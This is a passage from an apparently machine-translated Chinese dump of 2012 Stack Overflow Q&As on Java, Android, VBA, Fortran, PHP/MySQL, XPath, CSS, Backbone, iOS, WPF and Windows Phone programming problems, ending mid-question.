> 时间：2012-10-29T16:13:35.083
> 
> 标签：java, gson, instagram

尝试使用 gson 解析来自 instagram 的以下简单 json 响应，但我返回“com.google.gson.stream.MalformedJsonException: Unterminated object at line 1 column 21”：

```
{provider_url: http://instagram.com/, media_id: \"312873405259835666_223937937\", title:         \"#summer\", url: http://distilleryimage2.instagram.com/d4e0e83021cc11e2b74c22000a9f1427_7.jpg, author_name: \"kajsataskinen\", height: 612,width: 612,version: \"1.0\",author_url: http://instagram.com/, author_id: 223937937,type: \"photo\",provider_name: \"Instagram\"} 
```

如果我用双引号将 http 链接括起来，它就可以正常工作。有任何想法吗？

您可以在此处获得 instagram json 响应：http://instagram.com/api/v1/oembed/?url=http: [//instagr.am/p/RXjLRULekS/](http://instagram.com/api/v1/oembed/?url=http://instagr.am/p/RXjLRULekS/)

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:16:41.757

我可以看到两件事。

1.  您作为回复发布的内容实际上并不是它回复的内容

2.  那里的字符串被转义了，可能搞砸了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:16:43.143

至于我，响应被正确转义和“-ed：

```
{"provider_url":"http:\/\/instagram.com\/","media_id": 
```

显然，在您收到的字符串中缺少转义。您是如何得到它的？

# android - 为什么 setWifiEnabled 会为 CHANGE_NETWORK_STATE 权限抛出 SecurityException？

> ID：13125466
> 
> 赞同：3
> 
> 时间：2012-10-29T16:13:42.933
> 
> 标签：android, permissions, android-wifi, android-networking, android-permissions

在我的一个应用程序中，我正在更改 WiFi 状态。像这样：

```
wifiManager.setWifiEnabled(false); 
```

我在清单中有这些权限：

```
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
<uses-permission android:name="android.permission.UPDATE_DEVICE_STATS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> 
```

该代码在我的手机和大多数其他手机中运行良好。但是，今天我收到了带有以下错误的崩溃报告：

```
Caused by: java.lang.SecurityException: NetworkManagementService: Neither user 10147 nor current process has android.permission.CHANGE_NETWORK_STATE. 
```

堆栈跟踪表明此错误是由我正在更改 WiFi 状态 unsig 的行引起的`wifiManager.setWifiEnabled(false);`

为什么会这样？为什么它在几乎所有设备上都没有问题，为什么在这种特殊情况下会崩溃？它是Android版本还是设备依赖？我真的需要添加*权限*`android.permission.CHANGE_NETWORK_STATE`才能更改 WiFi 状态吗？

 ** * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:21:34.077

CHANGE_NETWORK_STATE 的文档说`Allows applications to change network connectivity state`所以我会说，是的，您确实需要添加权限。在我看来，禁用 wi-fi 很有可能会改变网络状态。

至于为什么会在这种特殊情况下发生，这当然可能是由于它运行在您以前没有测试过的 android 版本上。*

# ms-access - 通过 Access VBA 在 Excel 中添加格式条件

> ID：13125467
> 
> 赞同：1
> 
> 时间：2012-10-29T16:13:45.700
> 
> 标签：ms-access, excel, vba

所以目前我的代码中有这些行，

```
.Range("C2").Formula = "=IF(B2 = """"," & """REQUIRED""" & "," & """""" & ") "
.Range("C3").Formula = "=IF(B3 = """"," & """REQUIRED""" & "," & """""" & ") " 
```

我的目标是为其添加条件格式，因此，如果它等于范围 =$C$2:$C$3 中的必需，则将背景变为红色，到目前为止，我在网上看到了一些代码，但它们似乎都不适用。我出于我的目的修改了一些现有代码，因为我在 xlExpression“变量未定义”上出现错误。谁能帮我？

```
.Range("C2:C3").Selection.FormatConditions.Delete 
.Range("C2:C3").Selection.FormatConditions.Add TYPE:=xlExpression, Formula1:="=(=$C$2:$C$23 = 'REQUIRED')" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-01-16T11:54:36.607

您必须将 xlExpression 替换为 2。

# fortran - Fortran 90 代码将始终与 Fortran 95 编译器一起使用吗？

> ID：13125468
> 
> 赞同：0
> 
> 时间：2012-10-29T16:13:45.890
> 
> 标签：fortran, fortran90, fortran95

我们有一个用 Fortran 90 编写的复杂程序，我只能找到 Fortran 95 编译器。不幸的是，我的访问权限和经验有限，但需要立即了解问题。

使用 Fortran 95 编译器（例如 gfortran）是否可以始终正确编译 Fortran 90 代码？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-29T16:19:59.747

Fortran 版本是向后兼容的，这可能是一个错误。在 Fortran95 标准中，有一些非常（当之无愧的）晦涩的结构最终被删除：例如，从此[页面](http://sc.tamu.edu/IBM.Tutorial/docs/Compilers/xlf_8.1/html/lr424.HTM)：

> Fortran 95 表示已删除以下 Fortran 90 和 FORTRAN 77 功能：
> 
> *   ASSIGN 和分配的 GO TO 语句
> *   PAUSE 语句
> *   O 控制变量和实数类型的表达式
> *   H 编辑描述符
> *   从 IF 块外部分支到 END IF 语句

但是除非您的代码使用这些（而且不应该），否则您应该可以使用 F95；否则，大多数 F95 编译器仍然有一种模式，您可以使用该模式编译旧代码，例如`-std=legacy`gfortran。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:18:57.103

Fortran 编译器（IBM 除外）向后兼容。因此，任何有效的 F90 代码都将在 F95 编译器上编译。

IBM 做事不同，它们似乎是向前兼容的。所以`xlf`将从 77 开始编译，而将编译`xlf90`90/95，等等。

注意，**永远**是一个强词。这真的取决于你的编译器制造商。但是 GNU Fortran 或 Intel Fortran 目前只有一个编译器可用于所有类型的 Fortran，尽管有时对 F2003/2008 的支持参差不齐。

# php - mysqli 返回空结果 - 如何显示

> ID：13125469
> 
> 赞同：0
> 
> 时间：2012-10-29T16:13:50.523
> 
> 标签：php, mysqli

我有以下 PHP，它基本上得到了 MySQL 查询的结果：

```
$q2 = "SELECT FIELD FROM TABLENAME WHERE ID = 1;";
$con = new mysqli($server, $user, $pass);
if (mysqli_connect_errno()) 
{
    $error = mysqli_connect_error();
    exit();
}
else
{   
    $res = mysqli_query($con, $q2);
    if ($res)
    {   
        while($row = mysqli_fetch_assoc($res))
        {
            PRINT "THERE WAS A RESULT HERE: "; 
        }
    }
    else
    {
        $error = mysqli_error();
        exit();
    }
    mysqli_free_result($res);   
};
mysqli_close($con); 
```

但有时，它会返回一个空值。这是有效的，基于父应用程序的工作方式，但我怎样才能检测到空行并返回“这是一个空行：”？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:18:54.840

您可能想在 PHP 手册中查找 mysqli_num_rows()。它使您可以查看上一个查询生成的结果集中有多少行。您可以使用行数来确定是显示结果还是显示“无匹配结果”消息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T17:02:55.753

我希望这有帮助。

```
if ($res)
{   
    if($res->num_rows) {
        while($row = mysqli_fetch_assoc($res))
        {
           PRINT "THERE WAS A RESULT HERE: "; 
        }
    }
    else {
          PRINT "THERE WAS A EMPTY ROW: "; 
    }
} 
```

参考：[php.net](http://php.net/manual/en/mysqli-result.num-rows.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T17:19:54.470

谢谢你，我最终得到：

```
$q2 = "SELECT FIELD FROM TABLENAME WHERE ID = 1;";
$con = new mysqli($server, $user, $pass);
if (mysqli_connect_errno()) 
{
    $error = mysqli_connect_error();
    exit();
}
else
{   
$res = mysqli_query($con, $q2);

$row_cnt = mysqli_num_rows($res);

if ($row_cnt == 0)
{
        PRINT "THERE WAS NO RESULT: "; 
 }

else
{    
if ($res)
{   
    while($row = mysqli_fetch_assoc($res))
    {
        PRINT "THERE WAS A RESULT HERE: "; 
    }
}
else
{
    $error = mysqli_error();
    exit();
}
mysqli_free_result($res);   
}
};
 mysqli_close($con); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-05-25T11:50:19.463

我的 php 函数查询句柄：

```
private function query($sql_query){

        $result = $this->connection->query($sql_query);

        if(!$result){           //query fail
            throw new Exception($this->connection->error.$sql_query);
        }else {//                 "SUCCESS";
            if(!$result->num_rows)
            {
                throw new Exception("THERE WAS NO RESULT: "); 
             }
            for ($res = array(); $tmp = $result->fetch_array(MYSQLI_BOTH);){ 
                $res[] = $tmp;                
            }
           return $res;
        }
    } 
```

# mysql - 在创建 mysql 查询方面需要帮助

> ID：13125473
> 
> 赞同：-1
> 
> 时间：2012-10-29T16:14:17.560
> 
> 标签：mysql, inner-join

我有三个表 - 1-FriendShip、2-Users、3-Pages。Friendship 表有 fromUser 和 toUser 列。fromUser 列包含发起好友请求的用户。toUser 包含谁收到了好友请求（灵感来自 Facebook）

我想从 Pages 表中选择与给定用户是朋友的数据，比如“user1”。我可以使用以下查询获取 user1 的朋友：

```
 SELECT friends.`fromUser` AS `friend`
    FROM friends
    INNER JOIN users
    ON friends.`fromUser` = users.`userid`
    WHERE `friends`.`toUser`='user1'
 UNION
  SELECT friends.`toUser` AS `friend`
    FROM friends
    INNER JOIN users
    ON friends.`toUser` = users.`userid`
    WHERE friends.`fromUser`='user1' 
```

这给了我这样的结果：

好友
user2
user5

等等...

我想选择所有这些用户的页面并按时间戳列降序排列。有人请提供解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:17:56.140

您可以使用`IN`，假设您的 Pages 表有一个`userid`（或等效的）列：

```
SELECT * FROM Pages
WHERE userid IN (
   -- Your query to retrieve friends of user1
)
ORDER BY `timestamp` DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:18:11.987

因此，使用您拥有的查询作为派生表来加入：

```
SELECT *
FROM pages
INNER JOIN 
(
  SELECT friends.`fromUser` AS `friend`
    FROM friends
    INNER JOIN users
    ON friends.`fromUser` = users.`userid`
    WHERE `friends`.`toUser`='user1'
 UNION
  SELECT friends.`toUser` AS `friend`
    FROM friends
    INNER JOIN users
    ON friends.`toUser` = users.`userid`
    WHERE friends.`fromUser`='user1'
) AS friends ON pages.user = friends.friend
ORDER BY `timestamp` DESC 
```

# xpath - XPath 2.0 查询：1 个元素，检查两个日期之间

> ID：13125475
> 
> 赞同：1
> 
> 时间：2012-10-29T16:14:26.777
> 
> 标签：xpath, xpath-2.0, xpathquery

这就是我的 XML 文件的样子

（1 条记录：）

```
<movie>
    <idMovie>4373</idMovie>
    <Name>Casanova</Name>
    <Timestamp>2012-11-15 15:00:00</Timestamp>
    <is3D>1</is3D>
    <isNL>0</isNL>
    <Room>35</Room>
    <Theater>Kinepolis Brussel</Theater>
</movie> 
```

由于我需要检查下周播放哪些电影，我尝试了一个 XPath (2.0) 表达式，例如：

```
/movie[Theater="xxxx"][Timestamp>'2012-11-09']/Name 
```

它返回了所有时间戳大于 10 月 29 日的电影。但我需要 10 月 29 日到 11 月 5 日之间的所有电影。我想我需要一个 BETWEEN 函数或类似的东西。

希望有人能够提供帮助！

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:21:07.070

使用`and`：

```
[Timestamp>'2012-10-29' and Timestamp<'2012-11-05'] 
```

# html - 在 IE 中调整流体宽度部分的大小

> ID：13125476
> 
> 赞同：0
> 
> 时间：2012-10-29T16:14:32.953
> 
> 标签：html, css

我的网站是流体宽度，但一个部分没有正确调整大小 - 右侧图像位于标题的末尾。这是CSS：

```
#middle-top {
height:68px;
float:left;
width:81%;
border-left:1px solid #Fafafa;
} 
```

我使用了媒体屏幕样式表，但它仍然不能在所有浏览器中正常工作 - 即在 IE 中。

如果有人可以通过任何建议查看并减小窗口大小，那将是一个很大的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:24:51.867

而不是使用`img`标签。给与背景图像相同的图像`div#middle-top`并将其放置在右侧。

像这样的东西：

```
 background-image:  Image url1 , Image url2; /* does not support IE7 and IE8 */
 background-repeat: no-repeat, no-repeat;
 background-position: right; 
```

更新：

**要不然**

以百分比给出右侧图像，例如：

```
img#heart { width: 20%; } 
```

# tortoisesvn - 如何过滤 GitHub for Windows 中的历史记录条目？

> ID：13125477
> 
> 赞同：4
> 
> 时间：2012-10-29T16:14:43.157
> 
> 标签：tortoisesvn, github-for-windows

似乎无法在提交历史记录中找到特定条目，没有搜索框（就像 TortoiseSVN 的“显示日志”对话框中的那个），我也尝试右键单击历史记录列表，但没有弹出菜单。

那么如何快速找到提交历史呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:38:05.253

这似乎还不受支持（查看[“GitHub for Windows”发行说明](http://windows.github.com/release-notes.html)时）。

[使用像TortoiseGit](http://code.google.com/p/tortoisegit/)这样的替代客户端将是一个很好的解决方法，使用[Log Dialog](http://code.google.com/p/tortoisegit/wiki/Screenshots#Log_Dialog)。

![TortoiseGit 中的日志对话框](../Images/2cba7688e80acc8f2556cd4bbcd8909b.png)

# python - 存储永久数据的最佳实践？

> ID：13125478
> 
> 赞同：4
> 
> 时间：2012-10-29T16:14:44.177
> 
> 标签：python, python-2.7

首先是一些背景知识，我有一个 python 脚本，它将由 cron 作业定期调用。我在脚本中有一个整数变量，每次 cron 作业调用 python 脚本时都需要增加该变量。

例如，每个星期三都会增加变量的计数（75、76 等）。我尝试使用[Python I/O](http://docs.python.org/2/tutorial/inputoutput.html)在脚本之外创建一个参考文件，但是我打开文件的选项并没有真正帮助我。

> **w+**：打开一个文件进行读写。如果文件存在，则覆盖现有文件。如果文件不存在，则创建一个新文件进行读写。

如果每次打开文件都不会覆盖自身，则此选项将起作用。这意味着当脚本尝试将 1 添加到从文件中读取的内容时，它只是 null

> **r+**：打开一个文件进行读写。文件指针将位于文件的开头。

如果它不简单地将新计算的数字添加到文件的开头，则此选项将起作用，然后下一次它将读取新数字和先前数字的总量：

而不是在第二次运行时读取 71，而是读取 7170

可能有一种更好的方法可以在我不知道的脚本之外存储数据。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:18:33.500

你想要`r+`。但是，您希望`seek(0)`在写入之前，因此您从文件的开头而不是停止读取的位置开始写入。

您也可以打开文件两次，一次读取，一次写入，但效率低下。

# javascript - 骨干收藏的基本问题

> ID：13125483
> 
> 赞同：2
> 
> 时间：2012-10-29T16:14:57.027
> 
> 标签：javascript, collections, backbone.js, models

试图让我的头绕过 Backbone，并且工作得很好，直到我遇到了下面的障碍，这让我觉得我做错了。

在下面的代码中，我有一个模型和一个集合。该集合称为`bb.model.Settings`一个函数，该函数调用`changetheme`它获取一个值。现在我有这么远的价值，但是当我去保存这个项目时，我需要将它传递给模型吗？我正在尝试调用模型中的保存函数，但我想知道我是否真的需要这个，它总是失败。我应该只保存收藏还是保存它的最佳方法

```
bb.model.Setting = Backbone.Model.extend(_.extend({    
    defaults: {
        theme: 'e'
    },

    initialize: function() {
        var self = this
        _.bindAll(self)
    },
    save: function() {
        var self = this
        _.bindAll(self)
    },
}))

bb.model.Settings = Backbone.Collection.extend(_.extend({  
    model:  bb.model.Setting,
    localStorage: new Store("settingb"),

    initialize: function() {
        var self = this
        _.bindAll(self)
    },
    changetheme: function(value) {
        var self = this
        _.bindAll(self)
        this.remove
        this.model.save() 
    },
})) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T20:49:34.020

尝试检查这个小提琴，你的代码中有几个错误：

[http://jsfiddle.net/8gDqb/1/](http://jsfiddle.net/8gDqb/1/)

这是 js 部分，请参阅小提琴以获取完整的工作示例：

```
var bb = {};
bb.model={};

bb.model.Setting = Backbone.Model.extend({    
    defaults: {
        theme: 'e'
    },

    initialize: function() {
        var self = this
        //_.bindAll(self) // no longer necessary with backbone.js
    },
    save: function() {
        var self = this
        //_.bindAll(self) // no longer necessary with backbone.js
    },
});

bb.model.Settings = Backbone.Collection.extend({  
    model:  bb.model.Setting,
    //localStorage: new Store("settingb"),

    initialize: function() {
        var self = this
        //_.bindAll(self) // no longer necessary with backbone.js
    },
    changetheme: function(value) {
        var self = this
        _.bindAll(self)
        //this.remove
        //_.bindAll(self) // no longer necessary with backbone.js
    },
}); 
```

此外，以防万一您正在阅读有关网络骨干网的旧方法，您不再需要 bindAll 了。这已经有一段时间没有必要了。

# android - BillingService 泄露了 ServiceConnection

> ID：13125484
> 
> 赞同：2
> 
> 时间：2012-10-29T16:15:02.007
> 
> 标签：android

我试图将[Blundell 的应用内购买示例中](http://blog.blundell-apps.com/simple-inapp-billing-payment/)的代码集成到我自己的应用程序中，并且它几乎都能正常工作。我做了一个名为 shop.java 的活动，它有一组按钮，一个按钮对应于可以在我的应用程序中购买的每个可能的项目。如果我单击其中一个按钮，则会进行测试购买（“android.test.purchased”），并且似乎已成功执行。日志输出看起来令人放心：

```
CONFIRM_NOTIFICATIONS Sync Response code: RESULT_OK
Transaction complete
Transaction status: PURCHASED
Item purchased is: android.test.purchased
Received action: com.android.vending.billing.RESPONSE_CODE
checkResponseCode got requestId: 4731640731226687265
checkResponseCode got responseCode: RESULT_OK
Received action: com.android.vending.billing.RESPONSE_CODE
checkResponseCode got requestId: 1172244708705759861
checkResponseCode got responseCode: RESULT_OK
Received action: com.android.vending.billing.RESPONSE_CODE
checkResponseCode got requestId: 2684438012578976155
checkResponseCode got responseCode: RESULT_SERVICE_UNAVAILABLE
Key action: 4
clipservice: android.sec.clipboard.ClipboardExManager@41d443c0
Stopping Service 
```

控制权返回到 shop.java。我现在按下返回按钮返回我的应用程序的主要活动。我假设调用了 shop.java 的 onDestroy 方法，但现在我收到以下错误：

```
Service com.mycompany.mygame.BillingService has leaked ServiceConnection com.mycompany.mygame.BillingService@41d25498 that was originally bound here 
```

有任何想法吗？

**编辑：**刚刚注意到即使我不尝试购买任何东西，我也会得到完全相同的错误！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-23T20:39:00.233

初始化计费服务时，尝试为其提供应用程序上下文而不是活动上下文。利用：

```
getApplicationContext() 
```

# ios - 链接动画：第一个是即时的

> ID：13125487
> 
> 赞同：0
> 
> 时间：2012-10-29T16:15:12.677
> 
> 标签：ios, animation, uiviewanimation

下面的函数应该 A. 使视图变大 B. 等待 5 秒 C. 再次缩小它。问题是 A 立即发生，而不是在两秒钟内发生。

```
- (void) showAndHide {
CGRect r = self.frame;
float right = r.origin.x + r.size.width, h = r.size.height, y = r.origin.y;

[UIView animateWithDuration:2
                      delay:0
                    options:UIViewAnimationOptionCurveEaseInOut|UIViewAnimationOptionAllowUserInteraction
                 animations:^{
                     self.frame = CGRectMake(right - 400, y, 400, h);
                     [UIView animateWithDuration:2
                                           delay:5
                                         options: UIViewAnimationOptionOverrideInheritedCurve |
                      UIViewAnimationOptionCurveLinear |
                      UIViewAnimationOptionOverrideInheritedDuration
                                      animations:^{
                                          self.frame = CGRectMake(right - 40, y, 40, h);
                                      }
                                      completion:nil];

                 }
                 completion:nil]; 
```

}

这可能是什么原因造成的？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:19:27.433

将第二个动画放在第一个动画的完成处理程序中：

```
- (void) showAndHide {
CGRect r = self.frame;
float right = r.origin.x + r.size.width, h = r.size.height, y = r.origin.y;

[UIView animateWithDuration:2
                      delay:0
                    options:UIViewAnimationOptionCurveEaseInOut|UIViewAnimationOptionAllowUserInteraction
                 animations:^{
                     self.frame = CGRectMake(right - 400, y, 400, h);
                 }
                 completion:^{
                 [UIView animateWithDuration:2
                                       delay:5
                                     options: UIViewAnimationOptionOverrideInheritedCurve | UIViewAnimationOptionCurveLinear | UIViewAnimationOptionOverrideInheritedDuration
                                      animations:^{
                                          self.frame = CGRectMake(right - 40, y, 40, h);
                                      }
                                      completion:NULL];
                 }];
} 
```

您的方法的问题是，两个动画同时排队。如果您想坚持使用您的代码，我认为添加`UIViewAnimationOptionBeginFromCurrentState`到第二个动画的选项也可以解决您的问题。不过不太确定。

# ios - 具有动态 UILabel 的 UITableViewCell 的动态高度

> ID：13125488
> 
> 赞同：2
> 
> 时间：2012-10-29T16:15:21.480
> 
> 标签：ios, ios5, uitableview, ios6

我有一个 UITableViewController，它显示一个自定义 UITableViewCell（继承自 UITableViewCell）。同一个 UITableViewCell 有一个 UILabel 可以有可变长度的文本。我面临的挑战是如何在我的 UITableViewController 中访问这个 UILabel，以便我可以在 heightForRowAtIndexPath 中设置正确的单元格高度。

或者在旁注中，我如何解决动态大小标签的问题。

谢谢

这是我的自定义 UITableViewCell 代码：

标题：

```
#import <UIKit/UIKit.h>

@interface MessagesCustomViewCell : UITableViewCell

@property (nonatomic, weak) IBOutlet UILabel *message;   <---- need to access this 

@end 
```

执行：

```
#import "MessagesCustomViewCell.h"

@implementation MessagesCustomViewCell
@synthesize message=_message;

- (id)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(NSString *)reuseIdentifier
{
    self = [super initWithStyle:style reuseIdentifier:reuseIdentifier];
    if (self) {
        // Initialization code
    }
    return self;
}

- (void)setSelected:(BOOL)selected animated:(BOOL)animated
{
    [super setSelected:selected animated:animated];

    // Configure the view for the selected state
}

@end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:29:25.103

使用 Ivan 提到的测量字体大小的方法，您可以在 MessagesCustomViewCell 中额外添加一个类方法，

```
+ (CGFloat)heightForMessage:(NSString *)message; 
```

在其中您使用适当的 UILabel 宽度/高度、字体等计算消息的高度。这可以从 heightForRowAtIndexPath: 调用，如下所示：

```
NSString *dynamicString = [self.mydata objectAtIndex:indexPath.row];
CGFloat height = [MessagesCustomViewCell heightForMessage:dynamicString];
return height; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:21:39.960

数据更新后调用 [tableView reloadData]。

使用 heightForRowAtIndex 中的 [yourString sizeWithFont:(UIFont*) forWidth(CGFloat) lineBreakMode:(NSLineBreakMode)] 方法检查大小。引用的方法将返回所需的大小（包括高度）。

# java - Java核心：将null作为布尔值返回

> ID：13125493
> 
> 赞同：5
> 
> 时间：2012-10-29T16:15:31.257
> 
> 标签：java, null, boolean

我注意到了这件事：我的班级有`boolean`成员，并且在某个运行点我看到它在调试器中的价值为`null`. 但是当我使用 getter 方法时，它会返回`false`.

我知道，大多数书都告诉你，`boolean`在 Java 中只有两个值，不像 C/C++ 中每个非零数都可以解释为`true`. 所以我想知道，那里发生了什么？

`null`当某些其他类型的值或可以解释为时，是否还有其他情况`false`？也许对此的解释在 JLS 中的某个地方，有人可以指出我吗？

**编辑**：确实，昨天对于调试来说是糟糕的一天。首先，我浪费了 4 个小时来寻找错误的来源，当我反转源并再次进行相同的更改时，该错误消失了。然后这个。我只是试图重现，但不能。是流泪还是只是星期一是艰难的一天？我不知道。感谢大家的回应！我想你现在可以投票关闭或删除这个问题。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-29T16:16:40.803

听起来该字段被声明为可为[空的包装类型`Boolean`](http://docs.oracle.com/javase/7/docs/api/java/lang/Boolean.html)而不是[`boolean`原始](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)类型。

# php - MySQL - 在不存在的地方插入

> ID：13125494
> 
> 赞同：1
> 
> 时间：2012-10-29T16:15:32.127
> 
> 标签：php, mysql, sql

> **可能重复：**
> [如何在 MySQL 中“如果不存在则插入”？](https://stackoverflow.com/questions/1361340/how-to-insert-if-not-exists-in-mysql)

我有一些插入，如果那里没有相同的信息，我只希望它们实际插入。

我只希望插入使用 WHERE NOT EXISTS 运行，有人可以帮助我将其添加到我的查询中吗？

查询：

```
$db->Query("INSERT INTO `surfed` (site) VALUES('".$id."')"); 
```

非常感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:17:29.623

使用`IGNORE`关键字

```
INSERT IGNORE INTO surfed (user, site) VALUES('".$data['id']."', '".$id."') 
```

如果您对`user`-`site`组合有唯一键约束，那么它通常会在重复项上生成错误并中止插入。`ignore`在插入语句中使用将忽略错误并且不插入任何内容。

> 如果使用 IGNORE 关键字，则执行 INSERT 语句时发生的错误将被视为警告。... 使用 IGNORE，仍然没有插入该行，但没有发出错误。

有关它的更多信息，请参见[此处](http://dev.mysql.com/doc/refman/5.1/en/insert.html)

[SQLFiddle 示例](http://sqlfiddle.com/#!2/79bf4/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:32:57.057

您应该可以使用 mysql_num_rows。如果返回值 0，则表中没有任何内容与您要插入的内容相匹配。（不存在的地方）。所以做一些类似“如果mysql_num_rows = 0然后插入其他什么都不做”的东西。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:24:52.367

首先，您的两列需要是一个组合键，然后您可以`INSERT IGNORE`按照 juergen d 的概述使用或使用

```
ON DUPLICATE KEY UPDATE user=user 
```

在此处查看类似的问题： [INSERT ... ON DUPLICATE KEY (do nothing)](https://stackoverflow.com/questions/4596390/mysql-insert-on-duplicate-key-do-nothing-just-dont-complain-to-the-error)

对于只有站点列的修改问题，请***确保站点列是唯一键或主键***，然后使用

```
$db->Query("INSERT INTO `surfed` (site) VALUES('".$id."') ON DUPLICATE KEY UPDATE site=site"); 
```

# jquery - 使用 jQuery 加载页面时的 CSS 过渡

> ID：13125496
> 
> 赞同：1
> 
> 时间：2012-10-29T16:15:38.533
> 
> 标签：jquery, css

以下工作非常好，[http://jsfiddle.net/pDERw/199/](http://jsfiddle.net/pDERw/199/)，我怎样才能在页面加载时发生这种情况，目前它工作悬停状态

```
div:hover{do something} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:18:54.750

这取决于你想要哪个，但你可以把你的代码放在里面：

```
$(document).ready(function(){ //your code here }); 
```

或者可能：

```
$(window).load(function(){ //your code here }); 
```

第一个将在 DOMready 上执行（当所有元素都加载到 DOM 中时），第二个将在所有图像等都渲染后执行。

看到您的示例，最好的方法可能是将您的 div:hover 状态的 css 添加到一个类中，并将该类添加到加载事件的元素中。下面是一个例子：

[http://jsfiddle.net/pDERw/200/](http://jsfiddle.net/pDERw/200/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:26:48.817

你可以像这样创建一个黑客

```
<body>
    <div class="onLoad"><br /></div>
</body> 
```

并将样式替换`div :hover{ ... }`为

```
.onLoad
{
    -webkit-animation: 'zoom' 3s;
    width: 392px;
    height: 285px; 
    right:300px; 
    opacity:0.9; 
} 
```

**演示**：http: [//jsfiddle.net/chridam/pDERw/201/](http://jsfiddle.net/chridam/pDERw/201/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:22:19.177

我的解决方案是将 div:hover 变成一个全新的类，例如 .animated_load ，然后使用 jQuery 在页面加载时为您的 div 分配类，如下所示：

```
$(document).ready($('#div_id').addClass('animated_load')); 
```

# .net - 关于如何使用 Wpf DataGrid 实现批量编辑的想法？

> ID：13125498
> 
> 赞同：1
> 
> 时间：2012-10-29T16:15:47.170
> 
> 标签：.net, wpf, datagrid

（重大问题更新）

目标：选择一系列单元格（或行）的能力。更新一个单元格并将该更新级联到所有适用的单元格（例如同一列中的单元格）

还希望使用 Enter 提交并移动到下一个单元格而不丢失所选范围的 Excel 行为。

尝试使用 Wpf Datagrid 控件执行此操作.. 结果是杂乱无章..

*   数据网格支持使用 Ctrl / Shift 进行多选。
*   但是，在进入编辑模式时（与 SelectionMode 和 Unit 无关），所有其他行都将被取消选择，而将正在编辑的行作为唯一的选择。通过挂钩鼠标预览事件并缓存多选（如果有）来解决此问题。向我的行 ViewModels 添加了一个 IsSelected 属性，并使用它们随意修改选定的行。
*   只有在用户退出后才提交编辑。使用了将 UpdateSourceTrigger 设置为 PropertyChanged 的​​绑定。使用侦听来自 RowViewModels 的 PropertyChangeNotifications 的 ContainerVm 将当前编辑应用到缓存的多选。
*   DataGrid 事件没有帮助 - 在调用BeginningEdit 时，选择已由DataGridCell 中的MouseDown 处理程序修改。

所以网格事件和样式没有帮助。ViewModel 方法也没有。尝试的另一种选择是编写 DataGridCell 的派生并以某种方式将其插入。

想法？

# c# - 在 windows phone 中保存图像

> ID：13125499
> 
> 赞同：1
> 
> 时间：2012-10-29T16:15:52.940
> 
> 标签：c#, windows-phone-7, isolatedstorage

每当我尝试保存文件时，我都会收到此错误-

```
 1\. System.IO.IsolatedStorage.IsolatedStorageException was unhandled  
        Message=Operation not permitted on IsolatedStorageFileStream.  
        StackTrace:
               at System.IO.IsolatedStorage.IsolatedStorageFileStream..ctor(String
        path, FileMode mode, FileAccess access, FileShare share, Int32
        bufferSize, IsolatedStorageFile isf)
               at System.IO.IsolatedStorage.IsolatedStorageFileStream..ctor(String
        path, FileMode mode, FileAccess access, IsolatedStorageFile isf)
               at System.IO.IsolatedStorage.IsolatedStorageFile.OpenFile(String path,
        FileMode mode, FileAccess access)
               at PaintBrush.Save.savepic()
               at PaintBrush.Save..ctor()
               at PaintBrush.MainPage.click_btnSave(Object sender, RoutedEventArgs e)
               at System.Windows.Controls.Primitives.ButtonBase.OnClick()
               at System.Windows.Controls.Button.OnClick()
               at System.Windows.Controls.Primitives.ButtonBase.OnMouseLeftButtonUp(MouseButtonEventArgs
        e)
               at System.Windows.Controls.Control.OnMouseLeftButtonUp(Control ctrl,
        EventArgs e)
               at MS.Internal.JoltHelper.FireEvent(IntPtr unmanagedObj, IntPtr unmanagedObjArgs, Int32 argsTypeIndex, Int32
        actualArgsTypeIndex, String eventName) 
```

我正在尝试保存图像。我已经通过谷歌发现他们说在写入之前关闭文件流，但我无法理解。因为当我在写入之前关闭文件流时我遇到了同样的错误。这是我的代码-

```
public  void savepic()
        {
            string filename=DateTime.Today.ToString()+".jpg";

            using (IsolatedStorageFile myIsolatedStorage = IsolatedStorageFile.GetUserStoreForApplication())
            {
                using (IsolatedStorageFileStream fileStream = myIsolatedStorage.OpenFile(filename, FileMode.Open, FileAccess.ReadWrite))
                {
                    MediaLibrary mediaLibrary = new MediaLibrary();
